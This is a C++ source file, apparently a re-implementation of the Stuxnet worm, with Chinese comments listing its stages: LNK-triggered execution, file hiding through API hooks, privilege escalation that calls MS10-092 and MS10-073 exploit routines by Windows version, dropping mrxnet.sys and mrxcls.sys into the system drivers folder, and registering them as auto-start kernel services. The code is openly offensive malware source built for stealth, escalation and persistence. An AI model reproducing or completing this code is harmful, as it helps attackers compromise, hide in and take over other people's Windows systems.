// stuxnet_exploit.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include"include.h"

bool exp_main()
{
    //  阶段一：MS10-046 lnk触发执行
    //  阶段二：隐身
    //  阶段三：提权-创建lsass.exe，并提权，注入。
    //  阶段四：释放sys文件；
    //  阶段五：1.注册服务：mrxnet.sys(内核层隐藏文件)
    //          2.注册服务：mrxcls.sys(负责注入进程)
    //  阶段六：注入services.exe，S7tgtopx.exe
    //  阶段七：U盘和内网传播（MS10-046,MS08-067,MS10-061）

    /*阶段一：lnk触发执行****************************************************************/
    OutputDebugString(L"lnk execute!");

    return true;
}


bool exp_ring3_hide_file()
{
    /*阶段二：隐身***********************************************************************/
    OutputDebugString(L"create file hide apihook thread!");
    //kernel32.dll	FindFirstFileW,FindNextFileW 
    //ntdll.dll		NtQueryDirectoryFile,ZwQueryDirectoryFile
    HANDLE thread = CreateThread(0, 0, APIHOOK, 0, 0, 0);
    if (thread)
        OutputDebugString(L"file hide apihook thread Run...");
        //WaitForSingleObject(thread, INFINITE);
    return true;
}

bool exp_ring0_get_priv()
{
    /*阶段三：提权***********************************************************************/
    TargetInfo info;
    check_target_info(info);
    wchar_t buffer[200] = { 0 };
    wsprintf(buffer, L"current dwMajorVersion:%d dwMinorVersion: %d bIsWow64:%d", info.dwMajorVersion, info.dwMinorVersion, info.bIsWow64);
    OutputDebugString(buffer);
    if (check_admin() == FALSE)
    {
        //提权操作
        if (info.dwMajorVersion == 6 && info.dwMinorVersion <= 1)
        {
            //[ 'Windows Vista', 'Windows 7', 'Windows 2008' ]
            exp_ms10_092();
        }
        else if (info.dwMajorVersion == 5 && info.dwMinorVersion <= 2)
        {
            //[ 'Windows 2000', 'Windows XP' ]
            bool isXP = false;
            if (info.dwMinorVersion == 0)
                isXP = false;
            else
                isXP = true;
            DWORD dwThread = 0;
            OutputDebugString(L"start the thread!");
            exp_ms10_073(&isXP);
            //HANDLE thread = CreateThread(NULL, 0, exp_ms10_073, &isXP, 0, &dwThread);
            //if (thread)
            //    OutputDebugString(L"thread create success!");
            //    WaitForSingleObject(thread, INFINITE);    //会造成死锁
        }
    }
    OutputDebugString(L"Current privilige is system!");
    return true;
}

bool dropSysDriver()
{
    MoveFile(L"D:\\mrxnet.sys", L"C:\\windows\\system32\\drivers\\mrxnet.sys");
    MoveFile(L"D:\\mrxcls.sys", L"C:\\windows\\system32\\drivers\\mrxcls.sys");
    return true;
}

wchar_t g_szServiceName[100];

bool GetSysDriverName(const wchar_t* lpszSysDriverPath)
{
    if (!lpszSysDriverPath) {
        return FALSE;
    }
    g_szServiceName[0] = 0;
    int len = wcslen(lpszSysDriverPath);
    int i = 0;
    int j = 0;
    int dotPos = 0;
    int backslashPos = -1;
    for (i = len - 1; i >= 0; i--) {
        if (lpszSysDriverPath[i] == '.') {
            dotPos = i;
        }
        else if (lpszSysDriverPath[i] == '\\') {
            backslashPos = i;
            break;
        }
    }
    int nameLen = dotPos - backslashPos;
    for (i = 0, j = backslashPos + 1; j < dotPos; i++, j++) {
        g_szServiceName[i] = lpszSysDriverPath[j];
    }
    g_szServiceName[dotPos] = 0;
    return true;
}

bool loadSysDriver(wchar_t lpszSysDriverPath[])
{
    SC_HANDLE hSCManager;
    SC_HANDLE hSCService;
    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCManager == NULL) {
        return FALSE;
    }
    GetSysDriverName(lpszSysDriverPath);
    OutputDebugString(g_szServiceName);

    hSCService = CreateService(hSCManager,
        g_szServiceName,
        g_szServiceName,
        SC_MANAGER_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        lpszSysDriverPath,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL);
    if (hSCManager == NULL) {
        return FALSE;
    }

    StartService(hSCService, NULL, NULL);
    OutputDebugString(L"Install Service Success!");

    CloseServiceHandle(hSCService);
    CloseServiceHandle(hSCManager);
    return true;
}
